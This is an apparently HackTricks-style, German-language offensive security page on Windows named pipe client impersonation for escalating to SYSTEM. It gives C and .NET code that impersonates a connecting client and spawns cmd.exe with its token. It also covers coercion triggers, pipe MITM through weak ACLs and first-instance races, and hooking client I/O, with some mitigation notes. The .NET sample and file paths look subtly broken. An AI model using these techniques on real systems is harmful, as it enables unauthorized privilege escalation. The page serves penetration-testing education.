# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation ist ein lokales Privilege Escalation-Primitiv, das es einem named-pipe-Server-Thread ermöglicht, den Security Context eines Clients zu übernehmen, der sich mit ihm verbindet. In der Praxis kann ein Angreifer, der Code mit SeImpersonatePrivilege ausführen kann, einen privilegierten Client (z. B. einen SYSTEM-Service) dazu zwingen, sich mit einer vom Angreifer kontrollierten Pipe zu verbinden, ImpersonateNamedPipeClient aufrufen, das daraus resultierende Token in ein Primary Token duplizieren und einen Prozess als der Client starten (oft NT AUTHORITY\SYSTEM).

Diese Seite konzentriert sich auf die Kerntechnik. Für End-to-End-Exploit-Chains, die SYSTEM zu deiner Pipe zwingen, siehe die unten verlinkten Potato-Familienseiten.

## TL;DR
- Erstelle eine named pipe: \\.\pipe\<random> und warte auf eine Verbindung.
- Bringe eine privilegierte Komponente dazu, sich damit zu verbinden (spooler/DCOM/EFSRPC/etc.).
- Lies mindestens eine Nachricht aus der Pipe, und rufe dann ImpersonateNamedPipeClient auf.
- Öffne das Impersonation Token vom aktuellen Thread, DuplicateTokenEx(TokenPrimary), und CreateProcessWithTokenW/CreateProcessAsUser, um einen SYSTEM-Prozess zu erhalten.

## Requirements and key APIs
- Privileges, die vom aufrufenden Prozess/Thread typischerweise benötigt werden:
- SeImpersonatePrivilege, um einen sich verbindenden Client erfolgreich zu impersonieren und um CreateProcessWithTokenW zu verwenden.
- Alternativ kannst du nach der Impersonation von SYSTEM CreateProcessAsUser verwenden, was SeAssignPrimaryTokenPrivilege und SeIncreaseQuotaPrivilege erfordern kann (diese sind erfüllt, wenn du SYSTEM impersonierst).
- Verwendete Core APIs:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (muss mindestens eine Nachricht vor der Impersonation lesen)
- ImpersonateNamedPipeClient und RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW oder CreateProcessAsUser
- Impersonation level: Um lokal nützliche Aktionen auszuführen, muss der Client SecurityImpersonation erlauben (Standard für viele lokale RPC/named-pipe-Clients). Clients können dies mit SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION beim Öffnen der Pipe verringern.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notizen:
- Wenn ImpersonateNamedPipeClient ERROR_CANNOT_IMPERSONATE (1368) zurückgibt, stelle sicher, dass du zuerst aus der Pipe liest und dass der Client die Impersonation nicht auf Identification-Level eingeschränkt hat.
- Bevorzuge DuplicateTokenEx mit SecurityImpersonation und TokenPrimary, um ein Primary Token zu erstellen, das für die Process-Erstellung geeignet ist.

## .NET quick example
In .NET kann NamedPipeServerStream über RunAsClient impersonate. Nach der Impersonation dupliziere das Thread Token und erstelle einen Process.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
Diese Techniken zwingen privilegierte Dienste dazu, sich mit deiner named pipe zu verbinden, damit du sie impersonate kannst:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Siehe detaillierte Nutzung und Kompatibilität hier:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Wenn du nur ein vollständiges Beispiel dafür brauchst, wie man die pipe baut und impersonate, um SYSTEM aus einem service trigger zu starten, siehe:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

Wenn ein privilegierter Dienst und ein low-privileged process über `\\.\pipe\...` kommunizieren, behandle die pipe wie jede andere untrusted IPC-Grenze. Über klassische serverseitige impersonation hinaus können schwache pipe ACLs, unsichere Erstellungs-Flags und clientseitige Trust-Entscheidungen alle zu local privilege escalation-Primitiven werden.

### Enumerate candidate pipes first
- Liste pipes schnell aus PowerShell: `Get-ChildItem \\.\pipe\`
- Sysinternals `pipelist64.exe` ist nützlich, um Instance-Zahlen und single-instance pipes zu erkennen.
- Priorisiere Namen, die von Diensten verwendet werden, die als `SYSTEM` laufen, besonders helpers, updaters, launchers und UI brokers.

### MITM via permissive DACLs and extra pipe instances
- Jeder Prozess, der mit einem privilegierten Server sprechen kann, kann bereits sein protocol fuzzing und nach privilegierten Verben suchen.
- Der interessantere Fall ist, wenn die DACL `FILE_GENERIC_WRITE`/`GENERIC_WRITE` auf dem pipe object gewährt. Bei named pipes schließt das implizit `FILE_CREATE_PIPE_INSTANCE` ein (`FILE_APPEND_DATA` teilt sich dasselbe Bit), sodass ein Angreifer eine weitere Serverinstanz mit demselben Namen erstellen kann.
- Da Instanzen in FIFO-Reihenfolge gematcht werden, können angreifer-erstellte und legitime Instanzen ineinander verschachtelt werden: Erstelle eine rogue instance mit `CreateNamedPipe`, öffne dann denselben pipe-Namen mit `CreateFile`, und warte darauf, dass ein echter client auf der rogue server instance landet.
- Ergebnis: Beobachten, ändern, relayen oder desynchronisieren von privilegierter IPC, ohne den ursprünglichen server process besitzen zu müssen.

### First-instance race on pipe security descriptors
- `lpSecurityAttributes` definiert die DACL nur, wenn die erste Instanz eines pipe-Namens erstellt wird.
- Wenn ein privilegierter Dienst spät startet und `FILE_FLAG_FIRST_PIPE_INSTANCE` nicht verwendet, kann ein Angreifer den pipe-Namen vorab mit einer permissive DACL erstellen und den Dienst dann spätere Instanzen unter dem vom Angreifer gewählten security context erstellen lassen.
- Das macht den service startup zu einer race condition: Gewinnen der ersten Instanz, dann später Clients verbinden oder MITMen, die die geschwächte ACL nutzen.
- Mitigation für defenders und ein wichtiger Prüfpunkt für Angreifer: prüfen, ob `CreateNamedPipe(..., dwOpenMode, ...)` `FILE_FLAG_FIRST_PIPE_INSTANCE` enthält. Falls nicht, vor dem Start des Dienstes das Pre-Creation-Verhalten testen.

### PID/signature checks are hardening, not a boundary
- Einige Produkte versuchen, den Zugriff zu beschränken, indem sie `GetNamedPipeClientProcessId`, den process image path oder den Authenticode signer des verbindenden clients prüfen.
- Das hilft nur, bis du in den legitimen client injizierst: Sobald du im trusted process bist, erbst du genau den PID/image/signature context, den der server erwartet.
- Bei aufgeteilten Desktop-Apps ist das Instrumentieren des low-privileged UI/helper process oft einfacher als ein direkter Angriff auf den `SYSTEM`-Dienst.

### Hook the client according to its I/O model
- Synchronous I/O: intercept `NtWriteFile`, bevor der syscall den buffer verbraucht, und inspect/patch `NtReadFile`, nachdem er zurückkehrt.
- Overlapped I/O: speichere das `OVERLAPPED`/`IoStatusBlock`, das in `NtReadFile` gesehen wurde, und inspecte dann den buffer nach `GetOverlappedResult` oder wenn der relevante wait abgeschlossen ist.
- Completion ports: `GetQueuedCompletionStatus` erreicht `NtRemoveIoCompletion`; das zurückgegebene `ApcContext` verknüpft zurück mit dem `OVERLAPPED`, das beim ursprünglichen read verwendet wurde, und ist der richtige pivot, um den jetzt gefüllten buffer zu finden.
- Completion routines (`ReadFileEx`): Die completion callback wird als APC zugestellt. Wenn du zurückgegebenen data manipulieren oder synthetic replies injizieren willst, hook die echte completion routine und verwende für custom injection einen one-argument `QueueUserAPC` dispatcher, der die 3 erwarteten Argumente der routine rekonstruiert.

### Tooling notes
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) proxyt named-pipe traffic durch eine injected helper DLL und bietet einen Burp-like workflow für editieren/replay.
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) verfolgt einen Frida-basierten Ansatz und fokussiert auf das Hooking von `NtReadFile`/`NtWriteFile` plus die async/completion-Pivots oben, und leitet den Traffic dann an einen WebSocket-gestützten editing workflow weiter.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Operative Überlegungen
- Named pipes sind Low-Latency; lange Pausen beim Bearbeiten von Buffern können fragile Services deadlocken.
- Overlapped/completion-port/APC-driven Clients brauchen andere Hooks als einfache `ReadFile`/`WriteFile` detours.
- Injection in den vertrauenswürdigen Client ist laut und wird im Allgemeinen am besten für exploit development, protocol reversing oder lokales lab fuzzing aufgehoben.

## Troubleshooting und gotchas
- Du musst mindestens eine Nachricht aus der pipe lesen, bevor du `ImpersonateNamedPipeClient` aufrufst; sonst bekommst du `ERROR_CANNOT_IMPERSONATE` (1368).
- Wenn sich der Client mit `SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION` verbindet, kann der Server nicht vollständig impersonate; prüfe die impersonation level des Tokens über `GetTokenInformation(TokenImpersonationLevel)`.
- `CreateProcessWithTokenW` erfordert `SeImpersonatePrivilege` beim Aufrufer. Wenn das mit `ERROR_PRIVILEGE_NOT_HELD` (1314) fehlschlägt, verwende `CreateProcessAsUser`, nachdem du bereits SYSTEM impersonated hast.
- Stelle sicher, dass der security descriptor deiner pipe es dem Ziel-Service erlaubt, sich zu verbinden, wenn du ihn absicherst; standardmäßig sind Pipes unter `\\.\pipe` gemäß der DACL des Servers zugänglich.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
